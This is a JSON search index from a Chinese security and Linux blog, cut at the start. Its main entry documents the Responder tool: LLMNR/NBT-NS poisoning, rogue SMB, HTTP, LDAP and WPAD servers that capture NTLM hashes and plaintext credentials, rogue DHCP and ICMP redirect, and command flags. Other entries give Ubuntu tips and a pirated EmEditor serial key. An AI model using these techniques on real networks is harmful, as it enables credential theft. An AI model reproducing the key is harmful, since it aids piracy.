&amp;&amp; \\mv ./Responder /usr/share/responder responder -h 如果需要安装库请在此添加 功能拓展介绍响应LLMNR，NBT-NS和MDNS中毒者。它将根据其名称后缀回答特定的 NBT-NS（NetBIOS名称服务）查询（请参阅：http//support.microsoft.com/kb/163409）。默认情况下，该工具仅响应文件服务器服务请求，该请求适用于SMB。 这背后的概念是针对我们的答案，并在网络上更隐蔽。这也有助于确保我们不会破坏合法的NBT-NS行为。如果要回答Workstation Service请求名称后缀，可以通过命令行设置-r选项。 特征 内置SMB Auth服务器。 默认支持具有扩展安全性NTLMSSP的NTLMv1，NTLMv2哈希值。从Windows 95成功测试到Server 2012 RC，Samba和Mac OSX Lion。NT4支持明文密码，设置–lm选项时LM哈希降级。启动工具时，默认启用此功能。 内置MSSQL Auth服务器。 为了将SQL身份验证重定向到此工具，您需要为早于Windows Vista的系统设置选项-r（对于SQL Server查找的NBT-NS查询使用工作站服务名称后缀）（LLMNR将用于Vista和更高）。此服务器支持NTLMv1，LMv2哈希。此功能已在Windows SQL Server 2005和2008上成功测试。 内置HTTP Auth服务器。 为了将HTTP身份验证重定向到此工具，您需要为早于Vista的Windows版本设置选项-r（使用工作站服务名称后缀发送用于HTTP服务器查找的NBT-NS查询）。对于Vista及更高版本，将使用LLMNR。此服务器支持NTLMv1，NTLMv2哈希和基本身份验证。该服务器已在IE 6上成功通过IE 10，Firefox，Chrome，Safari测试。 注意：此模块也适用于从Windows WebDav客户端（WebClient）发出的WebDav NTLM身份验证。您现在可以将自定义文件发送给受害者。 内置HTTPS Auth服务器。 与上面相同。文件夹certs /包含2个默认密钥，包括虚拟私钥。这是故意的，目的是让Responder开箱即用。添加了一个脚本，以防您需要生成自己的自签名密钥对。 内置LDAP Auth服务器。 为了将LDAP身份验证重定向到此工具，您需要为早于Vista的Windows版本设置选项-r（使用工作站服务名称后缀发送用于HTTP服务器查找的NBT-NS查询）。对于Vista及更高版本，将使用LLMNR。此服务器支持NTLMSSP哈希和简单身份验证（明文身份验证）。此服务器已在Windows支持工具“ldp”和LdapAdmin上成功测试。 内置FTP，POP3，IMAP，SMTP Auth服务器。 此模块将收集明文凭据。 内置DNS服务器。 此服务器将回答A类型查询。当它与ARP欺骗相结合时，这非常方便。 内置WPAD代理服务器。 如果启用了“自动检测设置”，则此模块将捕获在网络上启动Internet Explorer的任何人的所有HTTP请求。该模块非常有效。您可以在Responder.conf中配置自定义PAC脚本，并将HTML注入服务器的响应中。请参阅Responder.conf。 浏览器监听器 该模块允许以隐身模式查找PDC。 主机指纹 当使用选项-f时，Responder将指示发出LLMNR / NBT-NS查询的每个主机。在指纹模式下，所有捕获模块仍可正常工作。 Icmp重定向 1python tools / Icmp-Redirect.py 适用于Windows XP / 2003及更早版本域成员的MITM。这种攻击与DNS模块相结合非常有效。 流氓DHCP 1python tools / DHCP.py DHCP通知欺骗。允许您让真正的DHCP服务器发出IP地址，然后发送DHCP Inform应答以将您的IP地址设置为主DNS服务器和您自己的WPAD URL。 分析模式 此模块允许您在网络上查看NBT-NS，BROWSER，LLMNR，DNS请求，而不会中断任何响应。此外，您可以被动地映射域，MSSQL服务器，工作站，查看您的子网上的ICMP重定向攻击是否合理。 哈希 日志文件根目录位于Responder工具主目录下 所有符合John Jumbo标准的密码哈希值以标准stdout流以如下格式转储到文件中，文件位于./log/下： 1(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt 单词哈希的日志：./log/(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt 所有活动的日志：./Responder-Session.log 分析模式的日志：./Analyze-Session.log 中毒模式的日志：./Poisoners-Session.log 此外，所有捕获的散列会记录到SQLite数据库中，(数据库可以在./Responder.conf中进行配置) 注意事项 此工具侦听多个端口：UDP 137，UDP 138，UDP 53，UDP / TCP 389，TCP 1433，TCP 80，TCP 139，TCP 445，TCP 21，TCP 3141，TCP 25，TCP 110，TCP 587和多播UDP 5553。 如果在系统上运行Samba，请停止smbd和nmbd以及在这些端口上侦听的所有其他服务。 对于Ubuntu用户： 编辑此文件/etc/NetworkManager/NetworkManager.conf并注释该行：dns=dnsmasq。然后用这个命令杀死dnsmasq（以root身份）：killall dnsmasq -9 可以在Responder.conf中关闭任何恶意服务器。 此工具不适用于Windows。 对于OSX，请注意：响应者必须使用-i标志的IP地址启动（例如-i YOUR_IP_ADDR）。OSX中没有用于自定义接口绑定的本机支持。使用-i en1将无法正常工作。另外，要以最佳体验运行Responder，请以root身份运行以下命令： 1234launchcl unload /System/Library/LaunchDaemons/com.apple.Kerberos.kdc.plistlaunchctl unload /System/Library/LaunchDaemons/com.apple.mDNSResponder.plistlaunchctl unload /System/Library/LaunchDaemons/com.apple.smbd.plistlaunchctl unload /System/Library/LaunchDaemons/com.apple.netbiosd.plist 参数细节暂停命令: CRTL-C 命令样例: responder -I eth0 -w -r -f responder -I eth0 -wrf 参数: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263--version显示版本号show program's version number and exit-h, --help 显示帮助文档show this help message and exit-A, --analyze 分析模式。此选项允许您查看NBT-NS、BROWSER、LLMNR请求，而无需响应。Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests without responding.-I eth0, --interface=eth0要使用的网络接口，可以使用“ALL”作为所有接口的通配符Network interface to use, you can use 'ALL' as a wildcard for all interfaces-i 10.0.0.21, --ip=10.0.0.21要使用的本地IP（仅用于OSX）Local IP to use (only for OSX)-e 10.0.0.22, --externalip=10.0.0.22用响应者的IP地址以外的其他IP地址毒害所有请求。Poison all requests with another IP address than Responder's one.-b, --basic 返回基本HTTP身份验证。默认值：NTLMReturn a Basic HTTP authentication. Default: NTLM-r, --wredir 启用netbios wredir后缀查询的答案。回复wredir可能会破坏网络上的内容。默认：falseEnable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network. Default: False-d, --NBTNSdomain 启用netbios域后缀查询的答案。对域后缀的应答可能会破坏网络上的内容。默认：FalseEnable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False-f, --fingerprint 此选项允许对发出NBT-NS或LLMNR查询的主机进行指纹识别。This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.-w, --wpad 启动WPAD流氓代理服务器。默认值是FalseStart the WPAD rogue proxy server. Default value is False-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY流氓WPAD代理用于传出请求的上行HTTP代理（格式：host:port） Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port) -F, --ForceWpadAuth 对wpad.dat文件检索强制NTLM/基本身份验证。这可能导致登录提示。默认：假Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt. Default: False-P, --ProxyAuth 强制NTLM（透明）/代理的基本（提示）身份验证。WPAD不需要打开。当与-r.Default:False组合时，此选项非常有效Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. This option is highly effective when combined with -r. Default: False--lm 强制Windows XP/2003和更早版本的LM哈希降级。默认：关闭(False)Force LM hashing downgrade for Windows XP/2003 and earlier. Default: False-v, --verbose 显示详情Increase verbosity. 参考链接 SpiderLabs Responder","link":"/2020/04/02/2020/0004.%E6%9C%8D%E5%8A%A1%E9%92%93%E9%B1%BC%20Responder/"},{"title":"迷途中遇到的小知识","text":"博客改造日记，方便日后复盘 博客文章不上传功能有些以前写的想下架、新开的坑却没有经历补等等，而且又懒得专门找个地方放着。整一个吧！","link":"/2017/01/03/constant/Untitled/"},{"title":"迷途中遇到的小知识","text":"此为笔者遇到的花式问题及处理措施，如有错误还请指出。 为ubuntu安装输入法当然是选择我们的搜狗啦~ 123$ wget http://cdn2.ime.sogou.com/dl/index/1524572264/sogoupinyin_2.2.0.0108_amd64.deb?st=8fT7QxeIsHVMBrye79UZkg&amp;e=1538377237&amp;fn=sogoupinyin_2.2.0.0108_amd64.deb$ sudo dpkg -i *.deb$ sudo apt -f install 为ubuntu选择一个GNU为了戒掉图形化界面，我选择直接使用server版的ubuntu，习惯了之后发现桌面版的ubuntu好慢，而且吃内存。 现在我又需要一些比较好看的gui界面，毕竟帅是很重要的事情。 xfce4 ubuntu-gnome-desktop KDE plasma openbox 这里说一下ubuntu-gnome，因为我用的是这个。如果是原来没有GNU，比如server版，你需要安装套件避免出现软件缺失，也可以自己挑选组件安装。 1234$ sudo add-apt-repository ppa:gnome3-team/gnome3$ sudo apt-get update$ sudo apt-get install ubuntu-gnome-desktop # 套件# 不想安装套件可以使用 -&gt; sudo apt-get install gnome-shell gnome 记录一下在Ubuntu彩蛋(不限于ubuntu) 123456sudo apt install -y aptitude sl fortune-mod cmatrix lolcataptitude moo -vslfortune | rev cmatrixman cmatrix | lolcat 我调了几个，其中涉及的命令如上，至于参数自己猜猜~~~ Ubuntu库尽量选择清华库因为阿里云库很乱，网上没有官方配置文件，而清华源提供了，而且可以选择版本(这很重要，因为如果差了版本会遇到一些特有错误) 编译安装Python文件我这里是安装python3.4 123wget https://www.python.org/ftp/python/3.4.9/Python-3.4.9.tgz./configure --with-zlib --with-ssl # 编译python时,也一起编译zlib库,ssl库make altinstall # 普通安装, 不会建立软链接, 防止在更换默认的Python二进制文件在 /usr/bin/python。 Linux强杀进程 kill -9 来强制终止退出, 例如: kill -9 3781 kill -STOP [pid] 发送SIGSTOP (17,19,23)停止一个进程，而并不消灭这个进程。 kill -CONT [pid] 发送SIGCONT (19,18,25)重新开始一个停止的进程。 kill -KILL [pid] 发送SIGKILL (9)强迫进程立即停止，并且不实施清理操作。 kill -9 -1 终止你拥有的全部进程。 killall 通过程序的名字,来杀死进程 例如: killall firefox 注意: 该命令可以使用 -9 参数来强制杀死进程, killall -9 firefox pkill 通过程序的名字, 直接杀死所有进程 例如: pkill firefox xkill 可以杀死图形程序应用, 例如firefox崩溃无响应, 可以使用该命令. 例如: 用法xkill , 会出现一个白色的x, 然后用鼠标单击想要杀死的应用 双系统WIN10关闭快速启动选项win10的快速启动会使磁盘设置为只读模式，这样进入另一个系统，挂载的磁盘为只读就会出现问题。所以我们需要关闭win的快速启动 管理员权限打开cmd命令行：powercfg /h off Kali Nat模式共享主机所在局域网 设置主机使用的网卡开启共享给vm8虚拟网卡 vm -&gt; 虚拟网络编辑器设置vm8(net模式)子网地址为192.168.137.1，配置正确的dhcp 确保虚拟机内部网络为dhcp模式 EmEditor采集于52pojie的一款文本编辑神器，废话不多说 官网：https://www.emeditor.com/download/ 安装版 installer 便携版 portable 永久序列号：DMAZM-WHY52-AX222-ZQJXN-79JXH 插件包：https://www.emeditor.com/library/ Wireshark In Kali解决方案：修改init.lua 直接运行wireshark的话会报错： 12Lua: Error during loading:[string \"/usr/share/wireshark/init.lua\"]:44: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user(). 十分尴尬，居然因root运行而被禁用 要对其进行修改，终端运行 1sudo gedit /usr/share/wireshark/init.lua 倒数第二行原来为：dofile(DATA_DIR..”console.lua”) 改为–dofile(DATA_DIR..”console.lua”) 操作系统的默认编码之前写一个目录控制脚本，在使用Java的IO流时，遇到一个奇怪的问题，测试代码如下： 123456// 我事先创建好一个目录s_test4File f = new File(\"E:\\\\code\\\\Java\\\\DirectoryControl\\\\s_test4\");File f2 = new File(\"E:\\\\code\\\\Java\\\\DirectoryControl\\\\s_test5\");f2.mkdir();// false | trueSystem.out.println(f.isDirectory() + \" | \" + f2.isDirectory()); 后查询资料得知： 因为系统编码与Java IO编码不同导致文档管理器出现异常 1.查询操作系统的默认编码 windows下 /^-?[0-9]+$/m 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 - C:\\Users\\****&gt;chcp - 活动代码页: 936通过查询下表：代码页 国家(地区)或语言 437 美国 708 阿拉伯文(ASMO 708)720 阿拉伯文(DOS)850 多语言(拉丁文 I) 852 中欧(DOS) - 斯拉夫语(拉丁文 II) 855 西里尔文(俄语) 857 土耳其语 860 葡萄牙语 861 冰岛语 862 希伯来文(DOS)863 加拿大 - 法语 865 日耳曼语 866 俄语 - 西里尔文(DOS) 869 现代希腊语874 泰文(Windows)932 日文(Shift-JIS)936 中国 - 简体中文(GB2312)949 韩文950 繁体中文(Big5)1200 Unicode 1201 Unicode (Big-Endian)1250 中欧(Windows)1251 西里尔文(Windows)1252 西欧(Windows)1253 希腊文(Windows)1254 土耳其文(Windows)1255 希伯来文(Windows)1256 阿拉伯文(Windows)1257 波罗的海文(Windows)1258 越南文(Windows)20866 西里尔文(KOI8-R)21866 西里尔文(KOI8-U)28592 中欧(ISO)28593 拉丁文 3 (ISO)28594 波罗的海文(ISO)28595 西里尔文(ISO)28596 阿拉伯文(ISO)28597 希腊文(ISO)28598 希伯来文(ISO-Visual)38598 希伯来文(ISO-Logical)50000 用户定义的50001 自动选择50220 日文(JIS)50221 日文(JIS-允许一个字节的片假名)50222 日文(JIS-允许一个字节的片假名 - SO/SI)50225 韩文(ISO)50932 日文(自动选择)50949 韩文(自动选择)51932 日文(EUC)51949 韩文(EUC)52936 简体中文(HZ)65000 Unicode (UTF-7)65001 Unicode (UTF-8) Linux下 12345678910111213141516@ubuntu:~$ localeLANG=en_US.UTF-8LANGUAGE=en_USLC_CTYPE=\"en_US.UTF-8\"LC_NUMERIC=\"en_US.UTF-8\"LC_TIME=\"en_US.UTF-8\"LC_COLLATE=\"en_US.UTF-8\"LC_MONETARY=\"en_US.UTF-8\"LC_MESSAGES=\"en_US.UTF-8\"LC_PAPER=\"en_US.UTF-8\"LC_NAME=\"en_US.UTF-8\"LC_ADDRESS=\"en_US.UTF-8\"LC_TELEPHONE=\"en_US.UTF-8\"LC_MEASUREMENT=\"en_US.UTF-8\"LC_IDENTIFICATION=\"en_US.UTF-8\"LC_ALL= 2.修改系统编码 网上只提到Linux下，Windows下没有。 笔者没有测试，但是若又需要这儿有个链接 apt之Could not get lock /var/lib/dpkg/lock解决方案12345- E: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable)- E：无法获得锁/var/lib/dpkg/锁定开放（11：资源暂时不可用）- E: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it?- E：无法锁定管理目录（/var/lib/dpkg/），另一种方法是使用它？ 所以,只要我们把锁删掉,就能运行apt了.1rm /var/lib/dpkg/lock 总结: 当我们遇到 apt 出这类问题的时候, 源于安装软件异常退出, 所以将lock删除, 即可继续使用. 小脚本解决问题 12mzl@ubuntu:~/shell$ cat clearAptLock.sh rm /var/lib/dpkg/lock","link":"/2017/01/03/constant/%E5%B0%8F%E9%97%AE%E9%A2%98/"},{"title":"博客改造日记","text":"博客改造日记，方便日后复盘 博客文章不上传功能有些以前写的想下架、新开的坑却没有经历补等等，而且又懒得专门找个地方放着。整一个吧！","link":"/2017/01/03/constant/%E5%8D%9A%E5%AE%A2%E6%94%B9%E9%80%A0%E6%97%A5%E8%AE%B0/"}],"tags":[{"name":"MYSQL","slug":"MYSQL","link":"/tags/MYSQL/"},{"name":"笔记","slug":"笔记","link":"/tags/%E7%AC%94%E8%AE%B0/"},{"name":"MIPS - asm","slug":"MIPS-asm","link":"/tags/MIPS-asm/"},{"name":"计算机网络","slug":"计算机网络","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"Maven","slug":"Maven","link":"/tags/Maven/"},{"name":"渗透","slug":"渗透","link":"/tags/%E6%B8%97%E9%80%8F/"},{"name":"PWN","slug":"PWN","link":"/tags/PWN/"},{"name":"web安全","slug":"web安全","link":"/tags/web%E5%AE%89%E5%85%A8/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"Java Web","slug":"Java-Web","link":"/tags/Java-Web/"},{"name":"SQL注入","slug":"SQL注入","link":"/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"工具","slug":"工具","link":"/tags/%E5%B7%A5%E5%85%B7/"},{"name":"CURL","slug":"CURL","link":"/tags/CURL/"},{"name":"Tools","slug":"Tools","link":"/tags/Tools/"},{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"漏洞复现","slug":"漏洞复现","link":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"移动安全","slug":"移动安全","link":"/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"},{"name":"HTTP","slug":"HTTP","link":"/tags/HTTP/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"编程","slug":"编程","link":"/tags/%E7%BC%96%E7%A8%8B/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"strusts2","slug":"strusts2","link":"/tags/strusts2/"},{"name":"struts2","slug":"struts2","link":"/tags/struts2/"},{"name":"java","slug":"java","link":"/tags/java/"},{"name":"虚拟化","slug":"虚拟化","link":"/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"内网渗透","slug":"内网渗透","link":"/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"扫描","slug":"扫描","link":"/tags/%E6%89%AB%E6%8F%8F/"},{"name":"内网","slug":"内网","link":"/tags/%E5%86%85%E7%BD%91/"},{"name":"编码","slug":"编码","link":"/tags/%E7%BC%96%E7%A0%81/"},{"name":"内存条","slug":"内存条","link":"/tags/%E5%86%85%E5%AD%98%E6%9D%A1/"},{"name":"公告","slug":"公告","link":"/tags/%E5%85%AC%E5%91%8A/"},{"name":"随笔","slug":"随笔","link":"/tags/%E9%9A%8F%E7%AC%94/"},{"name":"UNC injection","slug":"UNC-injection","link":"/tags/UNC-injection/"},{"name":"relaxing","slug":"relaxing","link":"/tags/relaxing/"},{"name":"algorithm","slug":"algorithm","link":"/tags/algorithm/"},{"name":"diary","slug":"diary","link":"/tags/diary/"},{"name":"question","slug":"question","link":"/tags/question/"}],"categories":[{"name":"生活","slug":"生活","link":"/categories/%E7%94%9F%E6%B4%BB/"}]}